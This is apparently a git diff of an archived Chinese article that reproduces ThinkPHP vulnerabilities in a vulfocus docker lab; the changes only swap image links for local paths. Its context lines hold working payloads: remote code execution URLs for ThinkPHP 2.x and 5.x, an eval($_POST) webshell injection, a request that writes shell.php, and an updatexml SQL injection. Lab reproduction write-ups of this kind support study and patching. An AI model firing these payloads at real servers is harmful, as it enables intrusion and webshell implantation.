@@ -49,15 +49,15 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/59DJy3nUg3JC-Zm0GPFm5A)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HhnEClSmc37Bxb1zZj7tialnNnk1dnmft6ibz6n2lZaheQClZ7FHjs4RElm391lFKwznAZicyxB8VmZvSSEGHrXHQ/640?wx_fmt=png)
+![](../../.resource/remote/d886a46b35ed3757855241e317630ebc373116546ee98ca202801f6af8fa5f8c.png)
 
 ThinkPHP 介绍
 
 ThinkPHP 是一个快速、兼容而且简单的轻量级国产 PHP 开发框架，诞生于 2006 年初，原名 FCS，2007 年元旦正式更名为 ThinkPHP，遵循 Apache2 开源协议发布，从 Struts 结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和 MVC 模式，融合了 Struts 的思想和 TagLib（标签库）、RoR 的 ORM 映射和 ActiveRecord 模式。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/KLN26icsnib2XYJCRIIHRBibXLekicoWWj63pjFjuYHlBicDncmnjctDfZtAbAodw3tO4bOczk4fxTl7EO5Pq2IM2LA/640?wx_fmt=png)
+![](../../.resource/remote/99c5b4752c7a1cf29ad50bd46440d648986ae5282e95ca99bc9db535c4f70db1.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/fw07L4QCL8zxn8yLTxgxtaKEBOmKyfeXzaxN31SQFNho0f9EIq2uoMDO2O2PzQEJB0sCg2O6oeeyT10sNPHgSQ/640?wx_fmt=png)
+![](../../.resource/remote/6bdb7bed4772716ca87c225abdaf0703bcfdbe7cd6e29206e54a4f153f56c553.png)
 
 漏洞复现
 
@@ -75,7 +75,7 @@ $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";'
 
 docker 拉一下 vulfocus 的 thinkphp2 环境，好用又方便
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oARYjuLM1DHJbDQ9aUeCzhDRfbDleENY1pl3gibRRuoJIVd7vxxJwk1g/640?wx_fmt=png)
+![](../../.resource/remote/0b767ebdaa0e2af274be8c9ff3c871c46d2af7dbedf559d1015e49e640ed4590.png)
 
 POC 尝试一波~~
 
@@ -83,7 +83,7 @@ POC 尝试一波~~
 /index.php?s=/index/index/aaa/${@phpinfo()}
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oQCvdibzM28vCxhNo3cqgvONemyNXUys7TzrwzD1cNQL1csg2W7zJOUg/640?wx_fmt=png)
+![](../../.resource/remote/ba08956b947d1bd067b269a795a844b9a8127c2601f276d97e9106e44ba3a478.png)
 
 进一步利用上传连一下马
 
@@ -93,7 +93,7 @@ POC
 /index.php?s=/index/index/aaa/${${@eval($_POST[pass])\}\}
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5o3Lq1GhlHEg4IOyauJZbjSdFrZD1pFc7UWwmYGI2DqNuO5NQR7grjeg/640?wx_fmt=png)
+![](../../.resource/remote/12d23147798949cc3c603c3a8cf1d6ee193f8ea148772d324cd66badf842b101.png)
 
 影响范围
 
@@ -109,7 +109,7 @@ ThinkPHP2.x
 /Application/Runtime/Logs/Home/21_04_20.log
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oGRyU8iaBQuicW9GTiaZByHtLBehDDZQP71hlujrQN1d0of2qklEOhPwuQ/640?wx_fmt=png)
+![](../../.resource/remote/c4ed6f84108403026c2efb603f6f32396926731d2dd0d7593c45a9e62b655f91.png)
 
 影响范围
 
@@ -129,13 +129,13 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 写入 shell.php
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oXqPHTEA9OAnuFH4kNksw8WUNaqiaSKMiaEJ7HpVlcOX3dZuV1jzCcZJw/640?wx_fmt=png)
+![](../../.resource/remote/0900a7590d6add107ef2304fdce843bcfbc5b3890e8eaf0996ba27a59ba0118b.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oUXL6INxE7icibGVhzYgEmoGiabblyZlpm6HEMLEKes8SFGKJIy9KJBgvg/640?wx_fmt=png)
+![](../../.resource/remote/9090a95bb8f34a536370c57b7ef50cea25fb9747540c8fccadd80bdd6bdfc510.png)
 
 蚁剑连一波
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oMh0iclIqdhkRiangNShkcdPbIALuNLSkPdVpiaDfqb8rIuCePQcmL4OIA/640?wx_fmt=png)
+![](../../.resource/remote/9444f723a3e64a3f0a063e3b579e13a79e7fdd4ba24d7cb936ddf9156370a502.png)
 
 影响范围
 
@@ -151,9 +151,9 @@ Thinkphp5.x 版本中没有对路由中的控制器进行严格过滤，没有�
 /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=命令参数
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5ohtwBTSs1nDKbMWh5cfG8Dqlz1p7DvrD399t4eGl1iaX3YAmhHU8oYibg/640?wx_fmt=png)
+![](../../.resource/remote/28cc8d9b86ba1c795629e52da86c27935ef7ad1d9c6b6b9e622105b61c49ba68.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oCeXeOs4BYHZgaFcI4AIkahXmWTiafVfVzfdtaBw4iaZvhnpB6Tux2q2w/640?wx_fmt=png)
+![](../../.resource/remote/dc0c55a4b53be04b1a162ff529d1fe9b435bddccf6c3e0116cde25ef9e6a3505.png)
 
 影响范围
 
@@ -169,7 +169,7 @@ POC 地址
 index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5o1Im9D1j00TqxcouF8mUrb3laVXf2Vop0hic6vKxQmy4cSm4BQSia2UCw/640?wx_fmt=png)
+![](../../.resource/remote/fb412fd6f00afb9c7a252e94ed6544af157aec893c3b99eaa2d59ccec1c3f998.png)
 
 影响范围
 
@@ -181,13 +181,13 @@ ThinkPHP 5.1.X
 
 因为在 thinkphp6 下 session 是默认关闭的，在这里是需要我们手动开启的，在 app/middleware.php 文件下。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oOribbXc3OaaHztv9ctjCzSRVKHNuulj2voyt2XAgGicvM3BZUJw7lxyQ/640?wx_fmt=png)
+![](../../.resource/remote/1281b0739095193f7e002bdb6623ba2f75b781b47ad52fb4bfaab2e85745c878.png)
 
 修改 app
 
 构造 poc
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oiavHyF06W0ME70zpkKlpbicgQXZbDHSjZ11N2R2Nzsia9VqiaoshBz0C6g/640?wx_fmt=png)
+![](../../.resource/remote/6ab73e5198331edb17befb24ab52bcb116b143fe3c29425402b8b6cee163196f.png)
 
 最后这里不知道是哪里出了问题创建不了，session 也开了，有哪位大佬帮忙指点一下。
 
@@ -197,9 +197,9 @@ ThinkPHP 5.1.X
 
 原文链接：https://blog.csdn.net/yangbz123/article/details/115329314
 
-![](https://mmbiz.qpic.cn/mmbiz_png/T1ocbsicpkxBlicibWGmibaDNsxT1LB7mkaT1MLtLoWDxvmInMUN46nXLBdFd0zfhInGE0rKwIStKeFfzKvwj3bucg/640?wx_fmt=png)
+![](../../.resource/remote/c0c97363a228f3d2d42f56f86f614067cbc7069dc3621889b6e394f120ffc43c.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/XdbJYiapKibnUtaqVr3GWibmicickiaeCv8K4r8jEujtsazVzl2w84hcF15xlfmia2L8iaqT5u6OkqmatIncRytmAPllgQ/640?wx_fmt=png)
+![](../../.resource/remote/c0c97363a228f3d2d42f56f86f614067cbc7069dc3621889b6e394f120ffc43c.png)
 
 获取资源
 
@@ -211,9 +211,9 @@ ThinkPHP 5.1.X
 
 EXP 截图如下  
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oGr7xX1HYGG8rIKZssjGWAsOL70qP59icBK3OLlOnAYE8Wj6YBrIyCVg/640?wx_fmt=png)
+![](../../.resource/remote/3de38b1e1796f73fe5a5361f69ea39417edb200edde58591456bbddeba8a41a4.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oaLe9pNwO3oLaMBdmXInr4Hv7YQde7Vj2mgpVIqpPmnj5ooa9tTr86A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONSEzXa0bbtrrL1PK0Pia5t5oCY4ibibf6zvVIUznSFOCMyEbSjURfql2vNo1p0iaSq4KXGHb1icJNBh6pA/640?wx_fmt=png)
+![](../../.resource/remote/98fca869f2b9539722684def0007edbdbac9ffcfcf642647cd65c514d37f9ee2.png)![](../../.resource/remote/d9c8103dd96f167e993de2f481c6d171c7f3d375bc724abe3bf676749a302fd8.png)
 
 ---
 
